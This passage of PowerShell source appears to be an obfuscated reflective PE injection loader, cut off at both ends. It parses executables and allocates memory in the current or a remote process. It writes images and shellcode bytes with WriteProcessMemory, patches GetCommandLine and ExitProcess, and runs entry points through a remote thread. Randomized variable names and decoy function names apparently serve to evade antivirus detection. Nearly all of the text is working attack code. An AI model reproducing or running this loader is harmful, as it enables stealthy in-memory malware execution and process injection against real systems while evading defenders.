        else
        {
            if (($lAzRMYMK99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($lAzRMYMK99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $vjVgHLvf99 = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $vjVgHLvf99 = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($lAzRMYMK99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $vjVgHLvf99 = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $vjVgHLvf99 = $Win32Constants.PAGE_NOACCESS
                }
            }
        }

        if (($lAzRMYMK99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $vjVgHLvf99 = $vjVgHLvf99 -bor $Win32Constants.PAGE_NOCACHE
        }

        return $vjVgHLvf99
    }

    Function posture
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $dxaeqnSI99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $TIzknaum99
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$JHgDvnfs99 = [IntPtr](recessives ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TIzknaum99.IMAGE_SECTION_HEADER)))
            $HuezbtQs99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($JHgDvnfs99, [Type]$TIzknaum99.IMAGE_SECTION_HEADER)
            [IntPtr]$eduVZJnB99 = recessives ($PEInfo.PEHandle) ($HuezbtQs99.VirtualAddress)

            [UInt32]$izaXUQcJ99 = cutthroat $HuezbtQs99.Characteristics
            [UInt32]$ToHOvCdo99 = $HuezbtQs99.VirtualSize

            [UInt32]$YGIXskkb99 = 0
            aspire -FhIFlHBg99 "posture::VirtualProtect" -PEInfo $PEInfo -StartAddress $eduVZJnB99 -Size $ToHOvCdo99 | Out-Null
            $lKwXcapb99 = $dxaeqnSI99.VirtualProtect.Invoke($eduVZJnB99, $ToHOvCdo99, $izaXUQcJ99, [Ref]$YGIXskkb99)
            if ($lKwXcapb99 -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    Function whimsey
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $dxaeqnSI99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $bzbQFMbZ99,

        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $tORscXeh99
        )

        $GKDdyycw99 = @()

        $UHcuXCBr99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$YGIXskkb99 = 0

        [IntPtr]$TPnufisc99 = $dxaeqnSI99.GetModuleHandle.Invoke("Kernel32.dll")
        if ($TPnufisc99 -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]$UpjNgApb99 = $dxaeqnSI99.GetModuleHandle.Invoke("KernelBase.dll")
        if ($UpjNgApb99 -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        $OEWZYLPG99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($bzbQFMbZ99)
        $sZAAwETT99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($bzbQFMbZ99)

        [IntPtr]$ACoCdHnw99 = $dxaeqnSI99.GetProcAddress.Invoke($UpjNgApb99, "GetCommandLineA")
        [IntPtr]$bzbdoSOp99 = $dxaeqnSI99.GetProcAddress.Invoke($UpjNgApb99, "GetCommandLineW")

        if ($ACoCdHnw99 -eq [IntPtr]::Zero -or $bzbdoSOp99 -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(laundries $ACoCdHnw99). GetCommandLineW: $(laundries $bzbdoSOp99)"
        }

        [Byte[]]$ctFTHcXF99 = @()
        if ($UHcuXCBr99 -eq 8)
        {
            $ctFTHcXF99 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $ctFTHcXF99 += 0xb8

        [Byte[]]$zIQRUHHq99 = @(0xc3)
        $VcBIECEv99 = $ctFTHcXF99.Length + $UHcuXCBr99 + $zIQRUHHq99.Length

        $DuEwhfuf99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VcBIECEv99)
        $RcYHmcDB99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VcBIECEv99)
        $dxaeqnSI99.memcpy.Invoke($DuEwhfuf99, $ACoCdHnw99, [UInt64]$VcBIECEv99) | Out-Null
        $dxaeqnSI99.memcpy.Invoke($RcYHmcDB99, $bzbdoSOp99, [UInt64]$VcBIECEv99) | Out-Null
        $GKDdyycw99 += ,($ACoCdHnw99, $DuEwhfuf99, $VcBIECEv99)
        $GKDdyycw99 += ,($bzbdoSOp99, $RcYHmcDB99, $VcBIECEv99)

        [UInt32]$YGIXskkb99 = 0
        $lKwXcapb99 = $dxaeqnSI99.VirtualProtect.Invoke($ACoCdHnw99, [UInt32]$VcBIECEv99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$YGIXskkb99)
        if ($lKwXcapb99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $hmpJzHtQ99 = $ACoCdHnw99
        clothespin -Bytes $ctFTHcXF99 -pvgFYwns99 $hmpJzHtQ99
        $hmpJzHtQ99 = recessives $hmpJzHtQ99 ($ctFTHcXF99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($sZAAwETT99, $hmpJzHtQ99, $false)
        $hmpJzHtQ99 = recessives $hmpJzHtQ99 $UHcuXCBr99
        clothespin -Bytes $zIQRUHHq99 -pvgFYwns99 $hmpJzHtQ99

        $dxaeqnSI99.VirtualProtect.Invoke($ACoCdHnw99, [UInt32]$VcBIECEv99, [UInt32]$YGIXskkb99, [Ref]$YGIXskkb99) | Out-Null


        [UInt32]$YGIXskkb99 = 0
        $lKwXcapb99 = $dxaeqnSI99.VirtualProtect.Invoke($bzbdoSOp99, [UInt32]$VcBIECEv99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$YGIXskkb99)
        if ($lKwXcapb99 = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $knjXOwDO99 = $bzbdoSOp99
        clothespin -Bytes $ctFTHcXF99 -pvgFYwns99 $knjXOwDO99
        $knjXOwDO99 = recessives $knjXOwDO99 ($ctFTHcXF99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($OEWZYLPG99, $knjXOwDO99, $false)
        $knjXOwDO99 = recessives $knjXOwDO99 $UHcuXCBr99
        clothespin -Bytes $zIQRUHHq99 -pvgFYwns99 $knjXOwDO99

        $dxaeqnSI99.VirtualProtect.Invoke($bzbdoSOp99, [UInt32]$VcBIECEv99, [UInt32]$YGIXskkb99, [Ref]$YGIXskkb99) | Out-Null

        $yCIIYCHF99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach ($Dll in $yCIIYCHF99)
        {
            [IntPtr]$mEzmuoNk99 = $dxaeqnSI99.GetModuleHandle.Invoke($Dll)
            if ($mEzmuoNk99 -ne [IntPtr]::Zero)
            {
                [IntPtr]$QvyNlKVA99 = $dxaeqnSI99.GetProcAddress.Invoke($mEzmuoNk99, "_wcmdln")
                [IntPtr]$dJbTLIbh99 = $dxaeqnSI99.GetProcAddress.Invoke($mEzmuoNk99, "_acmdln")
                if ($QvyNlKVA99 -eq [IntPtr]::Zero -or $dJbTLIbh99 -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                $uHwnuPjt99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($bzbQFMbZ99)
                $ZHyFXSUe99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($bzbQFMbZ99)

                $ZTNRkDQx99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($dJbTLIbh99, [Type][IntPtr])
                $gtyeLLMs99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($QvyNlKVA99, [Type][IntPtr])
                $dRKgRmiu99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($UHcuXCBr99)
                $khNTfChd99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($UHcuXCBr99)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ZTNRkDQx99, $dRKgRmiu99, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($gtyeLLMs99, $khNTfChd99, $false)
                $GKDdyycw99 += ,($dJbTLIbh99, $dRKgRmiu99, $UHcuXCBr99)
                $GKDdyycw99 += ,($QvyNlKVA99, $khNTfChd99, $UHcuXCBr99)

                $lKwXcapb99 = $dxaeqnSI99.VirtualProtect.Invoke($dJbTLIbh99, [UInt32]$UHcuXCBr99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$YGIXskkb99)
                if ($lKwXcapb99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($uHwnuPjt99, $dJbTLIbh99, $false)
                $dxaeqnSI99.VirtualProtect.Invoke($dJbTLIbh99, [UInt32]$UHcuXCBr99, [UInt32]($YGIXskkb99), [Ref]$YGIXskkb99) | Out-Null

                $lKwXcapb99 = $dxaeqnSI99.VirtualProtect.Invoke($QvyNlKVA99, [UInt32]$UHcuXCBr99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$YGIXskkb99)
                if ($lKwXcapb99 = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($ZHyFXSUe99, $QvyNlKVA99, $false)
                $dxaeqnSI99.VirtualProtect.Invoke($QvyNlKVA99, [UInt32]$UHcuXCBr99, [UInt32]($YGIXskkb99), [Ref]$YGIXskkb99) | Out-Null
            }
        }


        $GKDdyycw99 = @()
        $gXRWfDLP99 = @() #Array of functions to overwrite so the thread doesn't exit the process

        [IntPtr]$mZxyvYOb99 = $dxaeqnSI99.GetModuleHandle.Invoke("mscoree.dll")
        if ($mZxyvYOb99 -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$LBVOAzZT99 = $dxaeqnSI99.GetProcAddress.Invoke($mZxyvYOb99, "CorExitProcess")
        if ($LBVOAzZT99 -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $gXRWfDLP99 += $LBVOAzZT99

        [IntPtr]$oDrQvtSC99 = $dxaeqnSI99.GetProcAddress.Invoke($TPnufisc99, "ExitProcess")
        if ($oDrQvtSC99 -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $gXRWfDLP99 += $oDrQvtSC99

        [UInt32]$YGIXskkb99 = 0
        foreach ($PDuCEwJb99 in $gXRWfDLP99)
        {
            $uGBPfnGv99 = $PDuCEwJb99
            [Byte[]]$ctFTHcXF99 = @(0xbb)
            [Byte[]]$zIQRUHHq99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            if ($UHcuXCBr99 -eq 8)
            {
                [Byte[]]$ctFTHcXF99 = @(0x48, 0xbb)
                [Byte[]]$zIQRUHHq99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$tulQXvsw99 = @(0xff, 0xd3)
            $VcBIECEv99 = $ctFTHcXF99.Length + $UHcuXCBr99 + $zIQRUHHq99.Length + $UHcuXCBr99 + $tulQXvsw99.Length

            [IntPtr]$LZqzaFKS99 = $dxaeqnSI99.GetProcAddress.Invoke($TPnufisc99, "ExitThread")
            if ($LZqzaFKS99 -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $lKwXcapb99 = $dxaeqnSI99.VirtualProtect.Invoke($PDuCEwJb99, [UInt32]$VcBIECEv99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$YGIXskkb99)
            if ($lKwXcapb99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $OULDfazf99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VcBIECEv99)
            $dxaeqnSI99.memcpy.Invoke($OULDfazf99, $PDuCEwJb99, [UInt64]$VcBIECEv99) | Out-Null
            $GKDdyycw99 += ,($PDuCEwJb99, $OULDfazf99, $VcBIECEv99)

            clothespin -Bytes $ctFTHcXF99 -pvgFYwns99 $uGBPfnGv99
            $uGBPfnGv99 = recessives $uGBPfnGv99 ($ctFTHcXF99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($tORscXeh99, $uGBPfnGv99, $false)
            $uGBPfnGv99 = recessives $uGBPfnGv99 $UHcuXCBr99
            clothespin -Bytes $zIQRUHHq99 -pvgFYwns99 $uGBPfnGv99
            $uGBPfnGv99 = recessives $uGBPfnGv99 ($zIQRUHHq99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LZqzaFKS99, $uGBPfnGv99, $false)
            $uGBPfnGv99 = recessives $uGBPfnGv99 $UHcuXCBr99
            clothespin -Bytes $tulQXvsw99 -pvgFYwns99 $uGBPfnGv99

            $dxaeqnSI99.VirtualProtect.Invoke($PDuCEwJb99, [UInt32]$VcBIECEv99, [UInt32]$YGIXskkb99, [Ref]$YGIXskkb99) | Out-Null
        }

        Write-Output $GKDdyycw99
    }

    Function Cuisinart
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $YefUqSNV99,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $dxaeqnSI99,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$YGIXskkb99 = 0
        foreach ($Info in $YefUqSNV99)
        {
            $lKwXcapb99 = $dxaeqnSI99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$YGIXskkb99)
            if ($lKwXcapb99 -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $dxaeqnSI99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

            $dxaeqnSI99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$YGIXskkb99, [Ref]$YGIXskkb99) | Out-Null
        }
    }


    Function muscle
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $BHTRESUz99,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )

        $TIzknaum99 = sooner
        $Win32Constants = duteous
        $PEInfo = hardware -BHTRESUz99 $BHTRESUz99 -TIzknaum99 $TIzknaum99 -Win32Constants $Win32Constants

        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $aDgyXNPm99 = recessives ($BHTRESUz99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $vzkkrSrD99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($aDgyXNPm99, [Type]$TIzknaum99.IMAGE_EXPORT_DIRECTORY)

        for ($i = 0; $i -lt $vzkkrSrD99.NumberOfNames; $i++)
        {
            $WiXLCxOW99 = recessives ($BHTRESUz99) ($vzkkrSrD99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $wvdYftqD99 = recessives ($BHTRESUz99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($WiXLCxOW99, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($wvdYftqD99)

            if ($Name -ceq $FunctionName)
            {
                $AfZuaqJq99 = recessives ($BHTRESUz99) ($vzkkrSrD99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $RkOEGjFo99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($AfZuaqJq99, [Type][UInt16])
                $uUcjoiao99 = recessives ($BHTRESUz99) ($vzkkrSrD99.AddressOfFunctions + ($RkOEGjFo99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $HQYaJPiK99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($uUcjoiao99, [Type][UInt32])
                return recessives ($BHTRESUz99) ($HQYaJPiK99)
            }
        }

        return [IntPtr]::Zero
    }


    Function salvers
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $mhtSMDwv99,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $CQEIQBeg99,

        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $zBmOaylB99,

        [Parameter(Position = 3)]
        [Bool]
        $CSQXLYeO99 = $false
        )

        $UHcuXCBr99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        $Win32Constants = duteous
        $dxaeqnSI99 = cracked
        $TIzknaum99 = sooner

        $OumnXgDL99 = $false
        if (($zBmOaylB99 -ne $null) -and ($zBmOaylB99 -ne [IntPtr]::Zero))
        {
            $OumnXgDL99 = $true
        }

        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = cadres -mhtSMDwv99 $mhtSMDwv99 -TIzknaum99 $TIzknaum99
        $rKrqCnuN99 = $PEInfo.OriginalImageBase
        $iUGmNtvO99 = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $iUGmNtvO99 = $false
        }

        $tJXOqfGp99 = $true
        if ($OumnXgDL99 -eq $true)
        {
            $TPnufisc99 = $dxaeqnSI99.GetModuleHandle.Invoke("kernel32.dll")
            $RWrGHNur99 = $dxaeqnSI99.GetProcAddress.Invoke($TPnufisc99, "IsWow64Process")
            if ($RWrGHNur99 -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]$kBUVClCB99 = $false
            $lKwXcapb99 = $dxaeqnSI99.IsWow64Process.Invoke($zBmOaylB99, [Ref]$kBUVClCB99)
            if ($lKwXcapb99 -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }

            if (($kBUVClCB99 -eq $true) -or (($kBUVClCB99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $tJXOqfGp99 = $false
            }

            $ojrcYsqP99 = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $ojrcYsqP99 = $false
            }
            if ($ojrcYsqP99 -ne $tJXOqfGp99)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $tJXOqfGp99 = $false
            }
        }
        if ($tJXOqfGp99 -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }

        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        [IntPtr]$GDuWTPUW99 = [IntPtr]::Zero
        $lRZHbDKH99 = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $CSQXLYeO99) -and (-not $lRZHbDKH99))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -CSQXLYeO99 flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$GDuWTPUW99 = $rKrqCnuN99
        }
        elseif ($CSQXLYeO99 -and (-not $lRZHbDKH99))
        {
            Write-Verbose "PE file doesn't support ASLR but -CSQXLYeO99 is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($CSQXLYeO99 -and $OumnXgDL99)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($OumnXgDL99 -and (-not $lRZHbDKH99))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $BHTRESUz99 = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $koQJmfmE99 = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $BHTRESUz99. If it is loaded in a remote process, this is the address in the remote process.
        if ($OumnXgDL99 -eq $true)
        {
            $BHTRESUz99 = $dxaeqnSI99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

            $koQJmfmE99 = $dxaeqnSI99.VirtualAllocEx.Invoke($zBmOaylB99, $GDuWTPUW99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($koQJmfmE99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($iUGmNtvO99 -eq $true)
            {
                $BHTRESUz99 = $dxaeqnSI99.VirtualAlloc.Invoke($GDuWTPUW99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
                $BHTRESUz99 = $dxaeqnSI99.VirtualAlloc.Invoke($GDuWTPUW99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            }
            $koQJmfmE99 = $BHTRESUz99
        }

        [IntPtr]$tnxBtELV99 = recessives ($BHTRESUz99) ([Int64]$PEInfo.SizeOfImage)
        if ($BHTRESUz99 -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy($mhtSMDwv99, 0, $BHTRESUz99, $PEInfo.SizeOfHeaders) | Out-Null


        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        $PEInfo = hardware -BHTRESUz99 $BHTRESUz99 -TIzknaum99 $TIzknaum99 -Win32Constants $Win32Constants
        $PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $tnxBtELV99
        $PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $koQJmfmE99
        Write-Verbose "StartAddress: $(laundries $BHTRESUz99)    EndAddress: $(laundries $tnxBtELV99)"


        Write-Verbose "Copy PE sections in to memory"
        paratroops -mhtSMDwv99 $mhtSMDwv99 -PEInfo $PEInfo -dxaeqnSI99 $dxaeqnSI99 -TIzknaum99 $TIzknaum99


        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        compatibly -PEInfo $PEInfo -rKrqCnuN99 $rKrqCnuN99 -Win32Constants $Win32Constants -TIzknaum99 $TIzknaum99


        Write-Verbose "Import DLL's needed by the PE we are loading"
        if ($OumnXgDL99 -eq $true)
        {
            index -PEInfo $PEInfo -dxaeqnSI99 $dxaeqnSI99 -TIzknaum99 $TIzknaum99 -Win32Constants $Win32Constants -zBmOaylB99 $zBmOaylB99
        }
        else
        {
            index -PEInfo $PEInfo -dxaeqnSI99 $dxaeqnSI99 -TIzknaum99 $TIzknaum99 -Win32Constants $Win32Constants
        }


        if ($OumnXgDL99 -eq $false)
        {
            if ($iUGmNtvO99 -eq $true)
            {
                Write-Verbose "Update memory protection flags"
                posture -PEInfo $PEInfo -dxaeqnSI99 $dxaeqnSI99 -Win32Constants $Win32Constants -TIzknaum99 $TIzknaum99
            }
            else
            {
                Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
            }
        }
        else
        {
            Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
        }


        if ($OumnXgDL99 -eq $true)
        {
            [UInt32]$ItcHywgU99 = 0
            $lKwXcapb99 = $dxaeqnSI99.WriteProcessMemory.Invoke($zBmOaylB99, $koQJmfmE99, $BHTRESUz99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$ItcHywgU99)
            if ($lKwXcapb99 -eq $false)
            {
                Throw "Unable to write shellcode to remote process memory."
            }
        }


        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($OumnXgDL99 -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $XHrcBVlA99 = recessives ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $MYKdepco99 = turtle @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $mnrXLTkE99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XHrcBVlA99, $MYKdepco99)

                $mnrXLTkE99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $XHrcBVlA99 = recessives ($koQJmfmE99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)

                if ($PEInfo.PE64Bit -eq $true)
                {
                    $cwLowaYk99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $NfmfHivg99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $QLKytqLM99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    $cwLowaYk99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $NfmfHivg99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $QLKytqLM99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $HgkmYpqK99 = $cwLowaYk99.Length + $NfmfHivg99.Length + $QLKytqLM99.Length + ($UHcuXCBr99 * 2)
                $kFjtVfJG99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HgkmYpqK99)
                $nyECfWXV99 = $kFjtVfJG99

                clothespin -Bytes $cwLowaYk99 -pvgFYwns99 $kFjtVfJG99
                $kFjtVfJG99 = recessives $kFjtVfJG99 ($cwLowaYk99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($koQJmfmE99, $kFjtVfJG99, $false)
                $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
                clothespin -Bytes $NfmfHivg99 -pvgFYwns99 $kFjtVfJG99
                $kFjtVfJG99 = recessives $kFjtVfJG99 ($NfmfHivg99.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($XHrcBVlA99, $kFjtVfJG99, $false)
                $kFjtVfJG99 = recessives $kFjtVfJG99 ($UHcuXCBr99)
                clothespin -Bytes $QLKytqLM99 -pvgFYwns99 $kFjtVfJG99
                $kFjtVfJG99 = recessives $kFjtVfJG99 ($QLKytqLM99.Length)

                $LNpFfeQJ99 = $dxaeqnSI99.VirtualAllocEx.Invoke($zBmOaylB99, [IntPtr]::Zero, [UIntPtr][UInt64]$HgkmYpqK99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($LNpFfeQJ99 -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }

                $lKwXcapb99 = $dxaeqnSI99.WriteProcessMemory.Invoke($zBmOaylB99, $LNpFfeQJ99, $nyECfWXV99, [UIntPtr][UInt64]$HgkmYpqK99, [Ref]$ItcHywgU99)
                if (($lKwXcapb99 -eq $false) -or ([UInt64]$ItcHywgU99 -ne [UInt64]$HgkmYpqK99))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $MfVedyeN99 = indissoluble -blAqmNlp99 $zBmOaylB99 -StartAddress $LNpFfeQJ99 -dxaeqnSI99 $dxaeqnSI99
                $RWrGHNur99 = $dxaeqnSI99.WaitForSingleObject.Invoke($MfVedyeN99, 20000)
                if ($RWrGHNur99 -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }

                $dxaeqnSI99.VirtualFreeEx.Invoke($zBmOaylB99, $LNpFfeQJ99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
